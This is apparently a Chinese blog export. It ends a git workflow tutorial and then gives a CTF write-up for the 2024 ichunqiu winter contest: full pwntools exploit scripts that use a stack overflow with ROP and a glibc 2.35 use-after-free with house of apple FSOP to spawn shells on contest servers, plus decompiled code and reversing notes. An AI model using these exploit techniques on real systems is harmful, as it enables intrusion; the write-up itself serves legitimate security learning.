<p>工作区：本地文件。git clone 下载到工作区，git pull 更新到工作区<br>暂存区：add 提交到暂存区。<br>本地仓库： commit 提交到本地仓库。fetch 从远程更新到本地仓库<br>远程仓库：push 提交到远程仓库。</p>
<h2 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h2><ol>
<li>git clone 后切换分支</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> &lt;remote&gt;</span><br><span class="line">git checkout -b feature/windows</span><br><span class="line">git branch -a</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>写点东西提交</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 提交到本地</span></span><br><span class="line">git diff     <span class="comment"># 本地仓库和本地工作区文件的diff</span></span><br><span class="line">git add xxx</span><br><span class="line">git commit   <span class="comment"># 使用 vim 写 commit 信息 </span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>push 到仓库</li>
</ol>
<ul>
<li>经过这一步，仓库应该存在两个branch</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 分支同步：main 分支</span></span><br><span class="line">git checkout main</span><br><span class="line">git fetch origin</span><br><span class="line">git diff</span><br><span class="line">git pull origin main</span><br><span class="line">git checkout feature/windows</span><br><span class="line"></span><br><span class="line"><span class="comment"># rebase: 先合并main分支commit，在合并本地的commit</span></span><br><span class="line">git rebase main</span><br><span class="line">git push -f origin feature/windows</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>main 远程分支合并</li>
</ol>
<ul>
<li>在 github 类似的地方提交一个 <code>pr(pull request)</code>，将 <code>feature/windows</code> 合并到 <code>main</code> 分支里</li>
<li>经过项目开发者审查，会进行合并。</li>
<li>删除远端 <code>feature/windows</code> </li>
<li>删除本地分支</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git branch -D feature/windows</span><br><span class="line"><span class="comment"># 最后需要我们在进行合并一下</span></span><br><span class="line">git pull origin main</span><br></pre></td></tr></table></figure>

<p>因此创建三个分支来维护。</p>
<h2 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h2><ol>
<li>将子模块文件夹加入到 <code>.gitignore</code> 文件内容中，这样主项目就能够无视子项目的存在。</li>
<li>git submodule 使用</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将仓库clone下来，出现一个 .submodule 文件</span></span><br><span class="line">git submodule add https://github.com/chaconinc/DbConnector</span><br><span class="line"></span><br><span class="line">git submodule update --remote &lt;repo&gt;</span><br></pre></td></tr></table></figure>

<h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><p>最新的不一定是最好的，还可能是bug 多多的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch -a  <span class="comment"># 先查看所有分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有的项目比较存在不同的tag</span></span><br><span class="line">git checkout &lt;branch&gt; &lt;tag&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有的项目存在版本 分支</span></span><br><span class="line">git checkout &lt;branch&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># commit 回退</span></span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git checkout &lt;comit_hash&gt;</span><br></pre></td></tr></table></figure>


<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git remote <span class="built_in">rm</span> -r --cached &lt;<span class="built_in">dir</span>/filename&gt;</span><br><span class="line">git commit -m <span class="string">&quot;delete&quot;</span></span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure>

<p>但是现在比较好的IDE只需要点击一下鼠标就行，也是很方便。</p>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>ichunqiu冬季赛</title>
    <url>/2024/01/28/ichunqiu%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
    <content><![CDATA[<blockquote>
<p>春秋杯 冬季赛</p>
</blockquote>
<span id="more"></span>
<h2 id="nmanager"><a href="#nmanager" class="headerlink" title="nmanager"></a>nmanager</h2><ol>
<li>随机数比较，但是1s 相对程序来说很撑，因此可以得到其seed</li>
<li>数组越界导致的栈溢出，往栈上写内容。</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">modify</span><span class="params">(<span class="type">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;## select the idx you want modify ##&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gender: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n], <span class="number">32uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;age: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">32</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;name: &quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>], <span class="number">64uLL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;[idx%d]:\nname: %s\nage: %lld\ngender: %s\n&quot;</span>,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)n,</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n + <span class="number">40</span>],</span><br><span class="line">      *(_QWORD *)&amp;a1[<span class="number">120</span> * n + <span class="number">32</span>],</span><br><span class="line">      &amp;a1[<span class="number">120</span> * n]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;quit now?(Y/y)&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">3uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( buf[<span class="number">0</span>] != <span class="string">&#x27;y&#x27;</span> &amp;&amp; buf[<span class="number">0</span>] != <span class="string">&#x27;Y&#x27;</span> );</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp如下</p>
<ul>
<li>栈上有个got表，本来是想泄露这个，但是在栈上的位置会变。后来直接泄露返回地址了。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p, cmd=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;nmanager_patched&quot;</span></span><br><span class="line">clib = CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment"># context.timeout = 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line">ip, port = <span class="string">&quot;39.106.48.123&quot;</span>, <span class="number">43714</span></span><br><span class="line">p = remote(ip, port)</span><br><span class="line">seed = clib.time(<span class="number">0</span>)</span><br><span class="line">clib.srand(seed)</span><br><span class="line">table = <span class="built_in">list</span>(<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>)</span><br><span class="line">num = clib.rand() % <span class="number">62</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;input password: &quot;</span>, table[num].encode())</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="string">b&quot;+&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span> * <span class="number">0x8</span>)</span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc.address = leak - <span class="number">0x29d90</span></span><br><span class="line"><span class="keyword">assert</span>(libc.address &amp; <span class="number">0xfff</span> == <span class="number">0</span>)</span><br><span class="line">log.success(<span class="string">&quot;libc =&gt; %#x&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;n&quot;</span>)</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi; ret&quot;</span>)).__next__()</span><br><span class="line">bin_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">system = libc.sym.system</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">og = libc.address + <span class="number">0xebcf8</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;## select the idx you want modify&quot;</span>, <span class="string">b&quot;8&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0xdeadbeef</span>) + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh)</span><br><span class="line">p.sendafter(<span class="string">b&quot;gender:&quot;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;age: &quot;</span>, <span class="built_in">str</span>(system))</span><br><span class="line">p.sendafter(<span class="string">b&quot;name: &quot;</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;quit now?(Y/y)&quot;</span>, <span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="book"><a href="#book" class="headerlink" title="book"></a>book</h2><p>UAF libc2.35，并且还没有沙箱，直接使用 <code>house of apple</code></p>
<ul>
<li>还可以劫持的 <code>tls_dtor_list</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/<span class="function">python3</span></span><br><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">s</span><span class="params">(data)</span>:</span></span><br><span class="line"><span class="function">    return p.send(data)</span></span><br><span class="line"><span class="function">def sa(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendafter(delim, data)</span></span><br><span class="line"><span class="function">def sl(data):</span></span><br><span class="line"><span class="function">    return p.sendline(data)</span></span><br><span class="line"><span class="function">def sla(delim, data):</span></span><br><span class="line"><span class="function">    return p.sendlineafter(delim, data)</span></span><br><span class="line"><span class="function">def r(num=</span><span class="number">4096</span>):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recv</span>(num)</span><br><span class="line">def <span class="built_in">ru</span>(delim, drop=False):</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvuntil</span>(delim, drop)</span><br><span class="line">def <span class="built_in">rl</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">recvline</span>(timeout=<span class="number">1</span>)</span><br><span class="line">def <span class="built_in">itr</span>():</span><br><span class="line">    <span class="keyword">return</span> p.<span class="built_in">interactive</span>()</span><br><span class="line">def <span class="built_in">lg</span>(name):</span><br><span class="line">    <span class="keyword">return</span> log.<span class="built_in">success</span>(<span class="string">&quot;\033[32m%s ==&gt; 0x%x\033[0m&quot;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line">def <span class="built_in">uu64</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">uu32</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">u32</span>(p.<span class="built_in">recvuntil</span>(b<span class="string">&quot;\xf7&quot;</span>)[<span class="number">-4</span>:].<span class="built_in">ljust</span>(<span class="number">4</span>, b<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">def <span class="built_in">itob</span>(num):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(num).<span class="built_in">encode</span>()</span><br><span class="line">def <span class="built_in">dbg</span>(p, cmd=<span class="string">&quot;&quot;</span>):</span><br><span class="line">    gdb.<span class="built_in">attach</span>(p, cmd)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">menu</span>(c):</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;&gt; &quot;</span>, <span class="built_in">itob</span>(c))</span><br><span class="line">def <span class="built_in">new</span>(idx, sz):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;what size :&quot;</span>, <span class="built_in">itob</span>(sz))</span><br><span class="line">def <span class="built_in">delete</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">show</span>(idx):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">def <span class="built_in">edit</span>(idx, con):</span><br><span class="line">    <span class="built_in">menu</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;Index:&quot;</span>, <span class="built_in">itob</span>(idx))</span><br><span class="line">    <span class="built_in">sla</span>(b<span class="string">&quot;content: &quot;</span>, con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&quot;pwn_patched&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = <span class="built_in">ELF</span>(file, checksec=False)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&quot;INFO&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = elf.<span class="built_in">process</span>()</span><br><span class="line">ip, port = <span class="string">&quot;8.147.135.190&quot;</span>, <span class="number">24343</span></span><br><span class="line">p = <span class="built_in">remote</span>(ip, port)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">10</span>, <span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">0</span>, <span class="number">0x428</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">1</span>, <span class="number">0x28</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">2</span>, <span class="number">0x418</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">4</span>, <span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">0</span>)</span><br><span class="line">leak = <span class="built_in">uu64</span>()</span><br><span class="line"></span><br><span class="line">libc.address = leak - <span class="number">0x219ce0</span></span><br><span class="line">system = libc.sym.system</span><br><span class="line">bin_sh = libc.<span class="built_in">search</span>(b<span class="string">&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">IO_list_all = libc.sym._IO_list_all</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">show</span>(<span class="number">1</span>)</span><br><span class="line">heap_base = <span class="built_in">u64</span>(<span class="built_in">r</span>(<span class="number">5</span>).<span class="built_in">ljust</span>(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">new</span>(<span class="number">11</span>, <span class="number">0x438</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">2</span>)</span><br><span class="line">payload = <span class="built_in">flat</span>(&#123;</span><br><span class="line">    <span class="number">0x18</span>: IO_list_all - <span class="number">0x20</span></span><br><span class="line">&#125;, filler = b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">0</span>, payload)</span><br><span class="line"><span class="built_in">new</span>(<span class="number">12</span>, <span class="number">0x438</span>)  # IO_list_all =&gt; chunk <span class="number">2</span></span><br><span class="line"></span><br><span class="line"># <span class="meta"># house of apple v2，change _IO_list_all</span></span><br><span class="line">fs = <span class="built_in">FileStructure</span>()</span><br><span class="line">fs.vtable = libc.sym._IO_wfile_jumps</span><br><span class="line">fs._IO_write_base = <span class="number">0</span></span><br><span class="line">fs._IO_write_ptr = <span class="number">1</span></span><br><span class="line">fs.chain = <span class="number">0</span></span><br><span class="line">fs._wide_data = heap_base + <span class="number">0xb80</span>  # chunk4</span><br><span class="line">payload = <span class="built_in">bytes</span>(fs)[<span class="number">0x10</span>:]</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">wdata = <span class="built_in">fit</span>(&#123;</span><br><span class="line">    <span class="number">0xe0</span><span class="number">-0x10</span>: heap_base + <span class="number">0xb80</span> + <span class="number">0xe0</span> + <span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0xe0</span>: &#123;</span><br><span class="line">        <span class="number">0x68</span>: libc.sym.system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, filler=b<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">edit</span>(<span class="number">4</span>, wdata)</span><br><span class="line"># _IO_wfile_overflow</span><br><span class="line"></span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;heap_base&quot;</span>)</span><br><span class="line"><span class="built_in">lg</span>(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">edit</span>(<span class="number">1</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x20</span> + b<span class="string">&quot;     sh;&quot;</span>)</span><br><span class="line"><span class="built_in">menu</span>(<span class="number">5</span>)</span><br><span class="line"><span class="meta"># dbg(p)</span></span><br><span class="line"><span class="built_in">itr</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="HouseofSome"><a href="#HouseofSome" class="headerlink" title="HouseofSome"></a>HouseofSome</h2><p>给出glibc2.38 patch文件：patch了 <code>_IO_wide_data</code> 的 <strong>虚表检查</strong>，常见的 house of 技术无法使用</p>
<figure class="highlight patch"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/libio/libioP.h b/libio/libioP.h</span></span><br><span class="line"><span class="comment">index 745278e..b3858d1 100644</span></span><br><span class="line"><span class="comment">--- a/libio/libioP.h</span></span><br><span class="line"><span class="comment">+++ b/libio/libioP.h</span></span><br><span class="line"><span class="meta">@@ -100,7 +100,7 @@</span></span><br><span class="line"> #define _IO_JUMPS_FILE_plus(THIS) \</span><br><span class="line">   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span><br><span class="line"> #define _IO_WIDE_JUMPS(THIS) \</span><br><span class="line"><span class="deletion">-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="addition">+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable))</span></span><br><span class="line"> #define _IO_CHECK_WIDE(THIS) \</span><br><span class="line">   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)</span><br></pre></td></tr></table></figure>

<p>程序不需要自己patch，指定了runpath</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -Wl,-R/path/to/library xxx.c                   <span class="comment"># 指定libc</span></span><br><span class="line">$ <span class="built_in">export</span> LD_RUN_PATH=/path/to/library  <span class="comment"># 或者</span></span><br><span class="line">$ ldd houseofsome</span><br><span class="line">	linux-vdso.so.1 (0x00007ffcca981000)</span><br><span class="line">	libc.so.6 =&gt; ./libc.so.6 (0x00007fbff2200000)</span><br><span class="line">	./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fbff24e6000)</span><br></pre></td></tr></table></figure>

<p>mmap 了一段可读可写的内存</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="number">0x114514000</span>        <span class="number">0x114515000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> [anon_114514] </span><br></pre></td></tr></table></figure>

<p>draw 时，因为没有判断offset的值，存在溢出问题</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !magic</span><br><span class="line">    &amp;&amp; dev</span><br><span class="line">    &amp;&amp; name</span><br><span class="line">    &amp;&amp; (<span class="built_in">printf</span>(<span class="string">&quot;offset&gt; &quot;</span>), offset = <span class="built_in">getint</span>(), <span class="built_in">printf</span>(<span class="string">&quot;length&gt; &quot;</span>), (<span class="type">unsigned</span> __int64)<span class="built_in">getint</span>() &lt;= <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fread</span>((<span class="type">void</span> *)(offset + <span class="number">0x114514000</span>LL), <span class="number">1uLL</span>, <span class="number">1uLL</span>, dev);</span><br><span class="line">    magic = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>记一下知识点：</p>
<ul>
<li>fopen函数会malloc一个堆块作为<code>_IO_FILE</code>管理结构，并头插进入<code>_IO_list_all</code>，使得libc内会存放一个堆地址</li>
<li>scanf 在输入 <code>+/-</code> 字符时，占位但是不覆盖，造成泄露栈</li>
</ul>
<p>HouseOfSome具体WP见官方，有时间再看：<a href="https://mp.weixin.qq.com/s/BBc-HCET6W91-tpVSs4PxQ">2023年春秋杯冬季赛WEB、PWN类题目解析</a></p>
<h2 id="upx2023"><a href="#upx2023" class="headerlink" title="upx2023"></a>upx2023</h2><p>010editor打开，将其中的 <code>upx</code> 改成 <code>UPX</code>, 然后使用<code>upx -d</code> 脱壳就行</p>
<p>其主要逻辑如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">42</span>]; <span class="comment">// [rsp+D0h] [rbp+50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+104h] [rbp+84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Seed; <span class="comment">// [rsp+108h] [rbp+88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  Seed = <span class="built_in">time</span>(<span class="number">0</span>i64);</span><br><span class="line">  <span class="built_in">srand</span>(Seed);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, Str);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;((std::istream *)&amp;std::cin, (std::string *)input);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>], (<span class="type">const</span> std::string *)input);</span><br><span class="line">  <span class="built_in">change</span>((std::string *)&amp;input[<span class="number">16</span>], (std::string *)&amp;input[<span class="number">32</span>]);<span class="comment">// 矩阵转置</span></span><br><span class="line">  std::string::<span class="keyword">operator</span>=(input, &amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( std::string::<span class="built_in">length</span>((std::string *)input) != <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (std::ostream *)std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, <span class="string">&quot;len error&quot;</span>);</span><br><span class="line">    std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v3);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v6, &amp;unk_46A020, <span class="number">0xA8</span>ui64);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">rand</span>() % <span class="number">255</span>;</span><br><span class="line">    v4 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](input, i);</span><br><span class="line">    <span class="keyword">if</span> ( (v8 ^ *v4) != v6[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异或问题：<strong>爆破时间戳（根据已知字符，前两个字符固定为 <code>f&#123;</code>）</strong>。change 函数是一个矩阵转化，因此可以直接使用字符串测试，并且得到其mapping，最后得到其结果</p>
